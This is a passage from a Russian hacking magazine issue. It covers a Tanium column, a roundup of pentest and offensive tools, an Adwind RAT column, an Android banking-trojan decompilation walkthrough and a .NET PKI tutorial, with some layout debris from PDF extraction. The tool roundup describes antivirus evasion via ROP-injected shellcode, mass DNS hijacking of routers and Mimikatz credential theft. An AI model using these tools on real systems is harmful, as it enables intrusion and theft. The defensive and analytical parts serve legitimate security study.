Skype и Airbnb, и заканчивая DigitalOcean, GitHub, Groupon, Pinterst, Slack, Stack
Overflow и так далее.
   Однако наличие крутых инвесторов — не главное пре-
имущество Tanium. Но что тогда? Давай разбираться.
Один из ключевых моментов, как мне кажется — то, что
бизнес Хиндави ориентирован не столько на безопас-
ность, сколько на IT в целом. Это позволяет им выходить
                                                        INFOна гораздо большие бюджеты, потому как решение Tanium
реально помогает в повседневной работе и оптимизиру-    У Бена Хоровица есть
ет информационные процессы. Чего, конечно, не скажешь      отличная книга про
                                                                            стартапы — называ-о продуктах по безопасности в целом.                                                                                 ется «Легко не бу-
   Так что это в итоге за зверь такой? Tanium — это си-                                                                                       дет». Очень советую
стема класса Endpoint Security с элементами SIEM. Она      прочесть любому
в виде легковесного агента ставится на все устройства       топ-менеджеру.
сети. После этого из основной консоли можно выполнять
различные действия: к примеру, найти все с такой-то версией Windows и та-
ким-то программным обеспечением, после чего передать найденным устрой-
ствам команду. Это может быть как установка обновлений, так и блокировка,
или еще что-нибудь.
   Особенность в том, что запросы к системе пишутся на понятном для че-
ловека языке, который в системе преобразуется в некие команды. Дополни-
тельная фишка — супервысокая скорость, которая позволяет за считаные се-
кунды передавать эти запросы миллионам устройств. Разработчики клянутся,
что реакция на любой запрос происходит не более чем за 15 секунд. Секрет
успеха — в p2p-соединениях между агентами.
  К примеру, поступила информация о процессе, который использует опре-
деленная малварь. Убить этот процесс разом на всех серверах можно, набрав
в консоли простую команду taskkill /F /IM AppX.exe.
   Я, конечно, никогда не сталкивался с такими задачами, но знаю, что в круп-
ных компаниях часто надо управлять тысячами разрозненных систем. В этом
плане решение смотрится перспективно. Tanium, если задуматься, — очень
крутая штука. Представь такой же мощный и быстрый поисковик по всем де-
вайсам. Вот лишь несколько задач, которые с его помощью легко решить:
•  найти определенное сообщение во всех логах событий Windows;
•  найти пользователей, которые прямо сейчас работают с определенным
   старым приложением, и отключить их;
•  поставить критичное обновление на тридцать тысяч систем за две минуты.

В СЕРДЦЕ TANIUM
Как это все работает? По сути, предельно просто. Есть так называемые сенсо-
ры (Sensors) — простые скрипты, где описывается, какие данные и откуда брать.
Есть пакеты (Packages) — это описания реакций на действия (например, забло-
кировать компьютер или пользователя или отправить в карантин всю сетку).
  Дальше ставится сервер, консоль для запросов и по агенту на каждый
компьютер. Все взаимодействие происходит по схеме p2p. Если с консоли
на сервер посылается запрос показать некоторые устройства, то этот запрос
переправляется определенным клиентам, а они, в свою очередь, опрашивают
других клиентов (например, тех, до которых не достучаться напрямую из-за
сетевых настроек и фаерволов) и так далее.
   Получается что-то вроде SIEM (в том плане, что есть единая консоль — так-
то это далеко не SIEM), который ничего не хранит, но зато быстро работает.
Когда-то немецкие аналитики писали про класс решений RTSI — Real Time
Security Intelligence. Сейчас проблема иная. С одной стороны, надо хранить
все события для истории, а с другой — надо в реальном времени получать
удобную выборку наиболее критичных событий. Традиционные SIEM, пытаясь
решить две задачи одновременно, терпят неудачу. Это постепенно приводит
к разделению на те системы, которые просто хранят события, и те, которые
почти в реальном времени сигнализируют о самых важных событиях. Они-то
и называются RTSI.
   Будет ли Tanium относиться к этому классу систем или вокруг него сформи-
руется новый класс, как быстро появятся конкуренты, оправдана ли вообще
шумиха, мы скоро узнаем. А пока следим за тем, как у ребят идут дела.
  На этом на сегодня все. Такой вот вводный экскурс. Следующий пост будет
о надвигающейся конференции RSA в Сан-Франциско, которую в этом году
посетят более тридцати тысяч человек. На ней, кстати, выступят и представи-
тели Tanium, а значит, можно будет узнать какие-нибудь интересные техниче-
ские подробности.

           Полезная информация

                • Сложности с инвестициями у новых стартапов
                • Примеры использования Tanium (pdf)
                • Подкаст об успехе Tanium
ВЗЛОМ





                                Дмитрий «D1g1» Евдокимов,
                                                               Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!
                         Автор:
                              Sergi Alvarez

                       URL:
                            github.com/nowsecure/fsmon

                       Система:
                          iOS / OS X / Android / Firefox OS / Linux


МОНИТОРИМ ФС
При исследовании любой программы среди прочего очень важно знать,
как программа работает с файлами: какие и когда файлы создает, что пишет
в файлы и так далее. Для ОС Windows в этом плане незаменимы инструменты
типа procmon или API Monitor (да и функциональность их шире, чем монито-
ринг операций с файлами).
  Для мобильных ОС, таких как iOS, Android и Firefox OS, подобного инстру-
мента долгое время не было, и нужно было писать собственные инструменты
на основе Xposed, Cydia Substrate или Frida.
  Fsmon — это инструмент, извлекающий события, связанные с файло-
вой системой, из определенной директории и представляющий их в консо-
ли с цветовым оформлением или в формате JSON в файле. Программа сра-
зу из коробки позволяет фильтровать события от определенных программ
на основании имени или PID. Уникальность данного инструмента, как уже го-
ворилось, в поддержке мобильных ОС, помимо десктопных OS X, Linux. Так,
для Android поддерживаются архитектуры x86, ARM, ARM64, MIPS.
  Параметры команды достаточно просты:

$ ./fsmon -h
Usage: ./fsmon [-jc] [-a sec] [-b dir]
                [-p pid] [-P proc] [path]
 -a [sec]  stop monitoring after N seconds
    (alarm)
 -b [dir]  backup files to DIR folder
    (EXPERIMENTAL)
 -c        follow children of -p PID
 -h        show this help
 -j        output in JSON format
 -f        show only filename (no path)
 -p [pid]  only show events from this pid
 -P [proc] events only from process name
 -v        show version
 [path]    only get events from this path

Для установки потребуется предварительно скомпилировать инструмент
из исходных кодов, детали смотри на странице проекта.



                         Автор:
                           Cory Duplantis

                       URL:
                               github.com/praetorian-inc/pentestly

                       Система:
                         Windows


PENTESTLY
Pentestly — это комбинация Python-инструментов для тестов на проникнове-
ние. При этом сам инструмент написан на PowerShell :).
   Особенности:
•  импорт Nmap XML;
•  проверка SMB-аутентификации:
   • индивидуальные аутентификационные данные,
   • файлы с аутентификационными данными,
   • без аутентификационных данных,
   • NTLM hash;
•  проверка привилегий локального администратора для успешной SMB-ау-
тентификации;
•  идентификация SMB-шар, доступных на чтение с валидными аутентифика-
ционными данными;
•  хранение аккаунтов администраторов Domain/Enterprise;
•  определение расположения процессов Domain Admin;
•  определение систем, входящих в Domain Admins;
•  выполнение PowerShell-команд в памяти и получение результата;
•  выполнение Mimikatz для получения паролей в открытом виде из памяти
(Invoke-Mimikatz.ps1);
•  получение командного шелла (Powercat);
•  получение сессии Meterpreter (Invoke-Shellcode.ps1).
  В основе проекта лежат инструменты: recon-ng, wmiexec.py, smbmap.py,
Invoke-Mimikatz.ps1, powercat.ps1, Invoke-Shellcode.ps1, CrackMapExec.



                         Автор:
                            Giorgos Poulios, Christoforos Ntantogian,
                               Christos Xenakis

                       URL:
                              github.com/gpoulios/ROPInjector

                       Система:
                         Windows

ROP ДЛЯ ОБХОДА AV
Полагаю, абсолютное большинство из нас при упоминании ROP (Return Oriented
Programming) сразу подумает, что речь пойдет об эксплуатации, об обходе DEP
(Data Execution Prevention). Но сейчас будет о другом. ROP позволяет предста-
вить ряд высокоуровневых операций через несколько более простых. Ряд ис-
следователей решили таким образом скрывать шелл-коды в чужих програм-
мах и написали ROPInjector.
   Инструмент написан на си (win32) и как раз предназначен для конвертиро-
вания шелл-кода в ROP-последовательность с дальнейшим встраиванием в ка-
кой-либо исполняемый PE-файл. Инструмент поддерживает только 32-битные
файлы и набор инструкций x86. Но распространяется он с открытым исходным
кодом, так что при желании поддержку других архитектур можно добавить са-
мому.
   ROPInjector показал очень хорошие результаты при сканировании получен-
ных файлов различными AV, так что это можно взять на вооружение.
   Инструмент впервые был представлен на конференции Black Hat USA 2015.
За более подробным описанием устройства инструмента можно обратиться
к слайдам «ROPInjector: Using Return Oriented Programming for Polymorphism and
AV Evasion» (pdf).
                         Автор:
                           Jhonathan Davi

                       URL:
                              github.com/jh00nbr/Routerhunter-2.0

                       Система:
                          Windows/ Linux


ОХОТА НА РОУТЕРЫ ОТКРЫТА
RouterhunterBR — инструмент на Pyhton для поиска уязвимых роутеров и про-
ведения атаки на них. RouterhunterBR предназначен для работы в сети Интер-
нет. При нахождении уязвимых устройств он способен проэксплуатировать
уязвимость на домашних роутерах и произвести атаку DNSChanger — изме-
нить настройки DNS. После чего, очевидно, можно заставить уязвимого поль-
зователя, к примеру, ходить через тебя и менять ему данные.
  На текущий момент инструмент способен эксплуатировать уязвимости:
•  в Shuttle Tech ADSL Modem-Router 915;
•  D-Link DSL-2740R;
•  D-Link DSL-2640B;
•  D-Link DSL-2780B DLink_1.01.14;
•  D-Link DSL-2730B AU_2.01;
•  D-Link DSL-526B ADSL2+ AU_2.01;
•  DSLink 260E.

Как правило, эксплуатируются такие уязвимости:
•  Unauthenticated Remote DNS Change;
•  Authentication Bypass DNS Change;
•  Bruteforce.
  Все достаточно просто и эффективно.
                         Автор:
                              cisco-sas

                       URL:
                               github.com/cisco-sas/kitty

                       Система:
                              Linux / OS X / Windows


KITTY — ФАЗЗИНГ-ФРЕЙМВОРК
Kitty — это модульный фреймворк для фаззинга на Python с открытым исход-
ным кодом. Появился на свет он под впечатлением от таких известных фаззе-
ров, как Sulley и Peach.
   Как говорят сами создатели этого фреймворка, при работе над ним была
задача сконцентрироваться на необычных целях. Целях, которые работают
не на TCP/IP-уровне, и при этом без переписывания всего с нуля каждый раз.
Фреймворк, естественно, включает в себя все стадии, которые только могут
быть в процессе фаззинга: генерацию данных, фаззинг, мониторинг цели.
   Особенности:
•  модульность — каждая функциональная часть обособлена и может быть
переиспользована;
•  расширяемость — есть ядро системы, все остальное можно расширять
на свое усмотрение;
•  модель данных — модель позволяет описывать сложные структуры данных,
включая строки, хеши, длины, условия и прочее;
•  состояния — возможность описывать порядок сообщений и их условия от-
правки;
•  фаззинг клиента и сервера;
•  кросс-платформенность.
   Так как в самом Kitty нет реализаций различных протоколов передачи дан-
ных (HTTP, TCP или UART), то можно обратиться к другому проекту автора —
katnip, и этого будет достаточно для старта.
                        Авторы:
                            Jared Haight

                       URL:
                               github.com/jaredhaight/psattack

                       Система:
                         Windows


PS>ATTACK
PS>Attack — портативная консоль, нацеленная на создание пентест-набора
на PowerShell.
   Инструмент  комбинирует  некоторые  наиболее  популярные  проекты
на PowerShell от сообщества безопасности в единый исполняемый файл. Это
все позволяет избежать детекта антивирусов и Incident Response teams. В ито-
ге получаем исполняемый файл, не завязанный на powershell.exe, а вместо это-
го идет прямое обращение через .NET-фреймворк. Также каждый из модулей
шифруется на произвольном ключе, и при запуске полученного файла проис-
ходит расшифровка в памяти (на диск ничего не записывается).
   PS>Attack содержит более ста команд для поднятия привилегий в системе,
исследования системы и извлечения данных. На текущий момент поддержи-
ваются следующие модули и команды:
•  Powersploit                        •  Nishang
     - Invoke-Mimikatz                           - Gupt-Backdoor
     - Get-GPPPassword                        - Do-Exfiltration
     - Invoke-NinjaCopy                         - DNS-TXT-Pwnage
     - Invoke-Shellcode                         - Get-Infromation
     - Invoke-WMICommand                    - Get-WLAN-Keys
     - VolumeShadowCopyTools                - Invoke-PsUACme
•  PowerTools                        •  Powercat
     - PowerUp                        •  Inveigh
     - PowerView
   Также есть команда get-attack для поиска модулей в текущей сбор-
ке. А для простой сборки собственной версии PS>Attack точно пригодится
PS>Attack Build Tool.
                         Автор:
                          Programa STIC

                      URL:
                              github.com/programa-stic/marvin-django/blob/
                         master/README_en.md

                       Система:
                              Linux

MARVIN — АНАЛИЗ
ANDROID-ПРИЛОЖЕНИЙ
Marvin — это система для анализа Android-приложений и поиска уязвимостей,
позволяет отслеживать изменения приложений через историю. Состоит из че-
тырех подсистем:
•  Marvin-django:        фронтенд         веб-приложения         для
использования и администрирования Marvin. Он также включает в себя клас-
сификатор, который помогает оценить вероятность, что данное Android-при-
ложение вредоносно;
•  Marvin-static-Analyzer: система статического анализа, которая использует
Androguard и Static Android Analysis Framework (SAAF);
•  Marvin-dynamic-Analyzer: система динамического анализа, которая исполь-
зует Android x86-эмулятор и Open Nebula виртуализацию для автоматического
поиска уязвимостей;
•  Marvin-toqueton: инструмент для автоматического анализа GUI в помощь
к динамическому анализатору Marvin.
  Для установки запусти скрипт setup.py. Сервер стартуется следующей ко-
мандой:

$ python manage.py runserver 0.0.0.0:[port]

За более подробной инструкцией обратись на страничку проекта.
 MALWARE: Колонка Дениса Макрушина
ВРЕДОНОСНЫЙ
 МАРКЕТИНГ





                      Денис Макрушин
                                                        defec.ru, twitter.com/difezza


 История кросс-платформенного вредоносного
 кода Adwind началась в январе 2012 года. Один
 из пользователей хакерского форума сообщил, что
 разрабатывается новый комплекс для организации
 удаленного администрирования (Remote Administration
 Tool, RAT). В конце 2015 года эксперты зафиксировали
 атаку на банк в Сингапуре. Расследование обнаружило
 примечательный факт: при атаке использовался
 вредоносный код, корни которого уходят к тому самому
 сообщению на хакерском форуме...
Как выяснилось, злоумышленники использовали ставшую уже классической
атаку типа «спирфишинг»: преступники рассылали на почтовые адреса со-
трудников банка специально подготовленные электронные письма с прикре-
пленным файлом, содержащим вредоносный код. Анализ файла позволил
опознать бэкдор, также известный как Adwind RAT.

MALWARE-AS-A-SERVICE КАК ЧАСТЬ CRIME-AS-A-SERVICE
Злоумышленники, преуспевшие в той или иной нише киберпреступности, неред-
ко предлагают свои услуги другим злоумышленникам. Так рождаются CaaS в це-
лом и MaaS в частности. Этим путем пошли и разработчики Adwind, которые ре-
ализовали модель подписки на пользование этим бэкдором. Злоумышленникам,
не обладающим квалификацией в построении бот-сетей, рассылке вредоносного
кода, организации хостинга для административной части и администрировании
зараженных станций, теперь доступны комплекты для билда троянов, позволяю-
щие заточить вредоносный код под нужды преступника и особенности планируе-
мой атаки. Это своеобразные WYSIWYG-редакторы в киберпреступном мире:
злодею не обязательно вникать в технические подробности функционирования
вредоносного кода — ему достаточно выбрать нужную функциональность из име-
ющегося арсенала и приступить к распространению полученного вредоносного
кода (которое, кстати, тоже может быть MaaS-услугой).
   Разумеется, эта бизнес-модель снижает порог входа для преступников. Им
теперь не нужно обладать техническими навыками или быть частью какого-ли-
бо андерграудного комьюнити для того, чтобы оперативно начать монетизи-
ровать свои идеи. А конкуренция на данном рынке заставляет MaaS-разра-
ботчиков снижать цены на свои услуги.





Гибкая система подписок, которые разработчики Adwind
предлагают другим киберпреступникам

JSocket.org — веб-сайт, при помощи которого злоумышленники довольно
успешно (их годовой оборот, согласно приблизительным оценкам, составляет
около 200 тысяч долларов) воплощают в жизнь концепцию MaaS. Кроме того,
JSocket — название одной из реинкарнаций Adwind, который неоднократно
светил свой исходный код в преступном сообществе и, как следствие, обра-
зовывал новые разновидности.





«Все для любимого пользователя!»

На своем веб-ресурсе злодеи предлагают не только саму малварь по подпи-
ске, но и техническую поддержку ее пользователя, дополнительные компонен-
ты и модули, бесплатный VPN-сервис и проверку семпла различными антиви-
русными движками. Однако среди пользователей Adwind нашлись и куда более
предприимчивые ребята, которые не стали ограничиваться заражениями обыч-
ных пользователей домашних компьютеров и выбрали цель покрупнее.


Устройства под управлением Windows, OS Х, Linux и Android — потенциальные
мишени для злодеев, использующих данный бэкдор.
Пример фишинг-письма, содержащего вредоносное вложение,
которое преступники отправляли финансовым организациям




КАК ЭТО РАБОТАЕТ
Обфусцированный JAR-контейнер, который жертва запускает из вложения
к письму, содержит в себе бэкдор, подгружающий дополнительные модули
на рабочую станцию жертвы — это позволяет обеспечить его относительно
малый размер (порядка 130 Кбайт). После установки бэкдора злоумышленни-
ки могут, например, установить дополнительный модуль для получения изо-
бражений с веб-камеры или записи звука через встроенный микрофон.
Ключевые этапы атак Adwind
Бдительность и внимательность:
«технологии» защиты от атак Adwind!

Чтобы закрепиться на рабочей станции, злоумышленник должен спровоциро-
вать жертву открыть вредоносное вложение в фишинговом письме. На данной
стадии с угрозой фишинговой корреспонденции успешно справляются суще-
ствующие антиспам-технологии, задача которых — отправить за борт пись-
мо с JAR-вложением. В данном случае, как обычно это бывает на начальных
стадиях атаки, ключевую роль играет человеческий фактор.
  После закрепления на рабочих станциях и сбора нужной информации
злоумышленникам необходимо вывести ценные данные на свои серверы —
последний этап довольно тривиального жизненного цикла атаки. Adwind
пытается подключиться к серверам злоумышленников. А это означает, что кор-
ректно настроенные средства межсетевого экранирования, запрещаю-
щие внешние подключения к IP-адресам, не присутствующим в белом списке,
заблокируют попытку вредоносного кода отправить важную информацию зло-
умышленникам.



Детальный анализ зловреда можно найти в соответствующем отчете исследо-
вателей «Adwind — a crossplatform RAT»; в двух словах, он обладал следующей
функциональностью:
•  захват видео с установленной на рабочей станции веб-камеры;
•  перехват нажатий клавиш;
•  кража паролей из популярных браузеров, баз данных и Outlook;
•  запись звука при помощи встроенного микрофона;
•  удаленный рабочий стол;
•  кража ключей для кошельков криптовалют.
Топ-10 стран
по количеству
жертв,
зараженных
бэкдором
Adwind
(по данным
ЛК за январь
2016)





ЗАКЛЮЧЕНИЕ
С одной стороны, квалифицированные преступники делают проще жизнь
своих «младших братьев», предоставляя свои услуги в качестве сервиса и,
тем самым, уменьшая порог входа в темный бизнес. С другой стороны, сами
пользователи и организации упрощают жизнь киберпреступности в целом,
когда забывают о «правилах личной гигиены» при работе в Сети (не откры-
вай вложения в сообщениях от третьих лиц!) и о политиках безопасности.
Знание — лучшая форма защиты.
КОДИНГ





                                                                           Антон Дмитриевич
                                                                              Нестеров
                                                                                              nevvostok@mail.ruПРАКТИКУМ
КОДЕРА-ИССЛЕДОВАТЕЛЯ:
КОВЫРЯЕМ ANDROID-МАЛВАРЬ

ДЕКОМПИЛИРУЕМ И ИЗУЧАЕМ ВРЕДОНОСНОЕ ПРИЛОЖЕНИЕ
НА ANDROID НА ПРИМЕРЕ WHATSAPP MESSENGER
Благодаря открытости и отсутствию встроенной си-
стемы защиты (а также легкомыслию пользовате-
лей, которые бездумно соглашаются устанавливать
программы из сомнительных источников, требую-
щие от них подозрительных полномочий) в Android
очень легко заводится различная малварь. Ну а наше
программерское дело простое — попробовать ра-
зобрать то, что написано злокодером. Посмотрим,
как это делается.

ДЕКОМПИЛЯЦИЯ APK-ПРИЛОЖЕНИЙ
Для исследования кода в APK-приложениях необходимо декомпилировать
его, то есть извлечь все данные, которые в нем содержатся.
   Выполнить декомпиляцию APK-приложения можно с помощью програм-
мы Apktool. Для того чтобы она нормально заработала на винде, необходимо
установить утилиту apktool-install-windows-r04-brut.





Рис. 1. Содержимое папки apktool





Рис. 2. Декомпиляция приложения
АНАЛИЗ ДЕЙСТВИЙ, ВЫПОЛНЯЕМЫХ ПРОГРАММНЫМ КОДОМ
Для примера рассмотрим приложение WhatsApp Messenger. В памяти подо-
пытного мобильного устройства я нашел программу под названием «WhatsApp
Messenger», которая (спойлер) на самом деле оказалась малварью под назва-
нием Android.Spy.230.origin (классификация Dr.Web).





                                          Рис. 3. Содержимое папки WhatsApp
                                       после декомпиляции приложения


                                          Рис. 4. Обнаружение Android.Spy.230.origin —
                                         действительно, это малварь

Android.Spy: краткая справка

Android.Spy — семейство многофункциональных троянцев, поражающих мо-
бильные устройства под управлением ОС Android. Распространяются на попу-
лярных сайтах (преимущественно китайских) в составе легитимных игр и при-
ложений, которые модифицированы злоумышленниками.



Для извлечения данного приложения воспользуемся программой Android
Debug Bridge. После успешного извлечения файла WhatsApp.apk его необходи-
мо декомпилировать с помощью Apktool. Теперь перейдем к исследованию со-
держимого каталога приложения. Для получения основной информации (какие
службы и компоненты использует приложение) изучим файл AndroidManifest.
xml. Воспользуемся для этого Android Studio.
Шаг 1
После запуска программы Android Studio необходимо выбрать Open an
existing Android Studio project и указать путь к каталогу декомпилированно-
го приложения. На рис. 5 показан пример открытия декомпилированного
приложения.





Рис. 5. Открытие декомпилированного приложения

Шаг 2
В меню  Project  File нужно выбрать
AndroidManifest.xml. На рис. 6 пред-
ставлено  содержимое  приложения
WhatsApp.

Шаг 3
Открыв AndroidManifest.xml, мы видим
запросы, с помощью которых приложе-
ние запрашивает у мобильного устрой-
ства различные функции и права досту-
                                              Рис. 6. Содержимое приложенияпа. Рассмотрим их в деталях.                                         WhatsApp

Шаг 4
Переходим в каталог /assets/gp/ и открываем файл dd_ru.html. Этот файл
содержит HTML-форму для ввода банковских реквизитов; так, например, по-
лучается информация о номере банковской карты (все остальные информа-
ционные поля карты, включая CVV2, обрабатываются похожим образом):





Шаг 5
В каталоге /gp/ открываем файл main_ru.js. Этот файл содержит сценарий
JavaScript, который отправляет на сервер http://www.binlist.net/json/ данные,
введенные в HTML-форме, для последующей проверки, на что указывают стро-
ки кода в файле main_ru.js:
Данная часть кода записывает в переменную bin первые шесть цифр банков-
ской карты, введенные в HTML-форме, и проверяет их на валидность.





Здесь мы видим, что информация из переменной bin отправляется на сервер
binlist.net для проверки введенных в HTML-форме данных, после чего сервер
преобразует полученные данные в формат JSON (JSON — текстовый формат
обмена данными, основанный на JavaScript).





Данный код содержит первые шесть цифр банковской карты, тип карты и на-
звание банка, выдавшего карту. На рис. 7 представлен результат выполнения
этого запроса в формате XML:
Рис. 7. Результат выполнения запроса на сервер www.binlist.net

Шаг 6
Для дальнейшего исследования приложения переходим в каталог /assets/
sbol/ и открываем файл index.html. В этом файле мы видим HTML-форму
для ввода банковских реквизитов, на что указывают строки кода, содержащи-
еся в файле index.html:





А вот и ввод информации о номере банковской карты. На рис. 8 представлена
форма ввода банковских реквизитов.





Рис. 8. Форма ввода банковских реквизитов
Шаг 7
 Переходим в каталог /assets/gp/ и открываем файл dd_ru.html. В конце этого
файла содержится скрипт, предназначенный для отправки полученных данных
 с сервера binlist.net в формате JSON:





Шаг 8
Возвращаемся к файлу AndroidManifest.xml, находим строку с кодом




 Эта строка задает адрес, куда будут отправляться данные, сформированные
 на сервере binlist.net.

АНАЛИЗЫ ПОКАЗЫВАЮТ
По результатам анализа кода мы увидели, что изученное «приложение» после
 ввода банковских реквизитов формирует запрос и отправляет его на сервер
 binlist.net для проверки и формирования банковских реквизитов в формате
JSON. После чего сформированные данные с сервера binlist.net отправляются
 на сервер mixapi2.euromostapi.com.
   Вывод: данное приложение может быть использовано злоумышленником
 для хищения денежных средств с банковских карт.

Мнение эксперта
Александр Свириденко, программист-исследователь компании «Доктор Веб»,
разработчик Dr.Web Security Space для Android

Хорошее введение в тему, с которого можно начинать долгую дорогу в мир изу-
чения вредоносного кода для Android и борьбы с ним. Конечно, существуют бо-
лее удобные инструменты декомпиляции, да и с обфусцированными троянами
придется намного больше повозиться, но это уже совсем другая история.
КОДИНГ





                                                                             Александр Ерыгин
                                                                                                  alex.erygin@gmail.com
ОТКРЫТЫЕ КЛЮЧИ
ДЛЯ СЕРЬЕЗНЫХ
                 ОСВАИВАЕМ PUBLIC
                   KEY CRYPTOGRAPHY
                  НА ПРАКТИКЕПАЦАНОВ
В этой статье я покажу, как реализовать основные опе-
рации по работе с PKI. Речь идет о подписи, проверке
подписи, шифровании и расшифровании в контексте
PKI. Теоретически данный код может использоваться
с любым CSP (Cryptography Service Provider), поддержи-
вающим интерфейс MS Crypto API. Я пользуюсь бес-
платным отечественным CSP. Почему отечественным?
Дело в том, что в .NET нет поддержки алгоритмов ГОСТ.
А если мы работаем с реальными проектами и, следо-
вательно, вынуждены соответствовать требованиям ре-
гуляторов в России, то без гостовских алгоритмов нам
никак. Но если установить отечественный криптопро-
вайдер, поддерживающий MS Crypto API, то все будет
тип-топ, потому что .NET при работе с CMS дергает
именно MS Crypto API.

КАРТИНА МИРА
Перед погружением в код давай разберем немного
терминологии. PKI — инфраструктура открытых клю-
чей. Как несложно догадаться, PKI основана на асим-
метричном шифровании. В симметричных шифрах
                                   WWWдля шифрования и расшифрования используется один
ключ. В асимметричных для шифрования используется                                                                   Хороший рассказ
один ключ, а для расшифрования — другой. Вместе они            про PKI
образуют ключевую пару.
                                                                        Очень подробно   Информация, необходимая для работы PKI, содер-                                                                     про сертификаты X.509
жится в сертификате X.509. В PKI участвуют как мини-           и не только
мум три стороны: Алиса, Боб и удостоверяющий центр
                                                                   PCKS #7(УЦ). У Алисы и Боба есть сертификаты с закрытым
ключом, подписанные так называемым корневым сер-                                                                  PCKS #10
тификатом УЦ. У Алисы есть сертификат Боба с откры-
тым ключом, а у Боба — сертификат Алисы с открытым       Internet X.509 Public Key
                                                                                         Infrastructure Certificate andключом. Алиса и Боб доверяют УЦ и благодаря этому                                                                                             Certificate Revocation List
могут доверять друг другу.                                               (CRL) Profile (txt)
Упрощенная
структура
PKI





СЕРТИФИКАТЫ X.509
Так повелось, что основным «активом» в PKI является сертификат X.509. Сер-
тификат — это что-то вроде паспорта, он содержит информацию, позволяю-
щую идентифицировать субъект, которому выдан сертификат (поле Subject),
указывает, кем он был выпущен (поле Issuer), серийный номер сертификата
и многое другое. В Windows управлять сертификатами можно с помощью ос-
настки «Сертификаты» (run→certmgr.msc).





Менеджер сертификатов
      Закрытый ключ для сертификата

Сертификаты хранятся в хранилищах («Личное», «Доверенные центры серти-
фикации», «Доверенные лица»...). При получении сертификата важно устано-
вить его в правильное хранилище. Так, сертификаты, которые ты хочешь ис-
пользовать для электронной подписи, должны быть установлены в хранилище
«Личное», а сертификаты получателей, которым нужно будет отправлять за-
шифрованные сообщения, — в хранилище «Доверенные лица». Сертификаты
удостоверяющих центров (УЦ) должны быть установлены в хранилище «Дове-
ренные корневые центры сертификации».
      Состав сертификата

При установке сертификата система предлагает два варианта: выбрать храни-
лище автоматически либо указать вручную. Рекомендую использовать второй
вариант, так как автоматика иногда устанавливает сертификат не в то храни-
лище. Сертификат, которым мы хотим подписывать сообщения, должен иметь
закрытый ключ. О наличии закрытого ключа можно узнать, посмотрев на свой-
ства сертификата, где русским по белому будет написано: «есть закрытый ключ
для этого сертификата».
           Состояние сертификата

  Самое интересное о сертификате мы можем узнать на вкладке «Состав».
  Обрати внимание на поля «Алгоритм подписи», «Алгоритм хеширования
подписи» и «Открытый ключ». Если хочешь использовать сертификат для осу-
ществления транзакций в России, во всех этих полях ты должен видеть слово
«ГОСТ». Также следует обратить внимание на значение поля «Использование
ключа» и поля «Действителен с» и «Действителен по»: первое позволит понять,
возможно ли использование сертификата для выполнения нужной нам опера-
ции (шифрование, подпись), а второе и третье — возможно ли использовать
данный сертификат в указанный момент времени. В дополнение к этому сле-
дует убедиться, что сертификат действителен. В этом нам поможет вкладка
«Путь сертификации». Если с сертификатом все хорошо, мы увидим надпись:
«Этот сертификат действителен».
ЦИФРОВАЯ ПОДПИСЬ
Представь, дорогой читатель, что ты занимаешься некой
очень ответственной работой. И результаты своей рабо-
ты отправляешь в виде отчетов, от которых в конечном
итоге зависят чьи-то конкретные судьбы и жизни. По-
лучатели твоих отчетов принимают на их основе очень
                                              WARNINGважные решения, и, если ты напортачишь, вполне мо-
жешь получить срок. Так вот, в таких ответственных орга-                                                                     Приведенный ниже код
низациях без электронной подписи никуда. Она позво-      предназначен исклю-
ляет тебе подписать тот самый суперважный секретный      чительно для ознаком-
                                                                         ления с PKI. Не следуетотчет своим сертификатом с закрытым ключом. Закры-                                                                          без оглядки исполь-
тый ключ, в идеале, может храниться на токене — специ-                                                                              зовать его в реальной
альном съемном устройстве, похожем на флешку, кото-             работе.
рое ты в редкие моменты достаешь из сейфа. Подпись
гарантирует, что твой отчет отправлен именно тобой,
а не уборщицей или сторожем. С другой стороны, ты не сможешь отказаться
от авторства (это называется «неотрекаемость») и, если накосячишь в своем
суперважном документе, на сторожа свалить вину не получится.
   Электронная подпись применяется не только в спецслужбах и органах,
но и в бизнесе. Например, для перевода пенсионных накоплений в НПФ: мы
генерируем запрос на сертификат, отправляем его в удостоверяющий центр
(УЦ). УЦ выпускает сертификат, мы подписываем сертификатом заявление
на перевод пенсионных накоплений, отправляем — и вуаля. Подпись также
позволяет осуществлять контроль целостности подписываемых данных. Если
данные будут изменены, подпись не пройдет проверку.
  Для программирования подписи необходимо ознакомиться с несколькими
классами .NET Framework:
•   X509Certificate2 — представляет собой сертификат X.509. Имя класса,
   оканчивающееся на 2, говорит о том, что класс является усовершенство-
   ванным аналогом класса X509Certificate.
•  X509Chain — позволяет строить и проверять цепочку сертификатов. Необ-
   ходима для того, чтобы убедиться в действительности сертификата.
•  SignedCms — позволяет подписывать и проверять сообщения PKCS#7.

Перед тем как заюзать наш сертификат, необходимо его проверить. Процеду-
ра включает в себя проверку цепочки сертификации, проверку срока действия
и проверку, не отозван ли сертификат. Если мы подпишем файл недействи-
тельным сертификатом, подпись будет недействительной.
Мы проверили сертификат и убедились, что он в порядке. Переходим непо-
средственно к подписыванию данных. Подпись бывает двух видов: прикре-
пленная и открепленная.





                                            Прикрепленная
                                           и открепленная подписи


Результатом прикрепленной подписи будет CMS  (Cryptography Message
Syntax) — сообщение, содержащее как подписываемые данные, так и саму
подпись. Открепленная подпись содержит только саму подпись. Рекомен-
дую использовать именно открепленную подпись, потому что с ней намного
меньше мороки. В нее проще поставить метку времени, она меньше весит, так
как не содержит подписываемые данные. Подписываемые данные легко от-
крыть, посмотреть. В случае прикрепленной подписи для того, чтобы просмо-
треть подписанные данные, CMS-сообщение необходимо сначала декодиро-
вать. В общем, прикрепленной подписи я рекомендую избегать всеми силами.
Если потребуется передавать подпись и контент вместе, рассмотри вариант
архивирования (вместо использования прикрепленной подписи используй от-
крепленную, просто заархивируй подписываемый файл и открепленную под-
пись). Посмотрим на код подписи (С#):





Но, как обычно это бывает у Microsoft, стоит сделать маленький шаг в сторону,
и розовый волшебный мир рушится



Глядя на примеры кода, можно подумать, что работа с подписью в .NET реали-
зована достаточно хорошо. Но, как обычно это бывает у Microsoft, стоит сделать
маленький шаг в сторону, и розовый волшебный мир рушится. Рассмотрим, на-
пример, случай, в котором необходимо осуществить подпись большого файла,
размером 600 MiB. Внимательные читатели обратили внимание на сигнатуру
метода подписи — он принимает на вход массив байтов. При попытке загру-
зить в массив байтов 600 MiB мы получим OutOfMemoryException.
